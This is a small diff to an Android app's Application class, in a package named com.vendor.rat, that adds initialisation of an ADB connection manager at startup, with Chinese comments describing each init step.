@@ -1,6 +1,7 @@
 package com.vendor.rat;
 
 import android.app.Application;
+import com.vendor.rat.adb.AdbConnectionManager;
 import com.vendor.rat.utils.SharedUtils;
 
 /**
@@ -21,6 +22,8 @@ public class MyApp extends Application {
         super.onCreate();
         // 初始化 SharedPreferences 工具
         SharedUtils.init(this);
+        // 初始化 ADB 连接管理器 (依赖 SharedUtils 做持久化)
+        AdbConnectionManager.init(this);
         // 初始化主应用管理器
         MainApplication.init(this);
     }
